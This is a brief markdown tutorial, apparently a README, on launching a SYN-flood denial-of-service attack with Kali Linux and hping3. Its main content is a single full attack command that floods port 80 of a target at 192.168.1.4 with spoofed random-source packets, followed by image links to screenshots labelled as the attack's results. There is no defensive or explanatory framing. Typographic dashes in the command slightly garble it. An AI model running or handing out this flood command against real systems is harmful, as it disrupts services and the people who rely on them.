# DDoS Attack using Kali Linux and hping3.

To make an SYN attack we will use Kali Linux and hping3. 
The command to send packets to a victim is:- hping3 -c 15000 -d 120 -S -w 64 -p 80 –flood –rand-source 192.168.1.4

![](https://i.imgur.com/WKPS7td.png)

#Results of the attack
![](https://i.imgur.com/5z2LtrT.png)
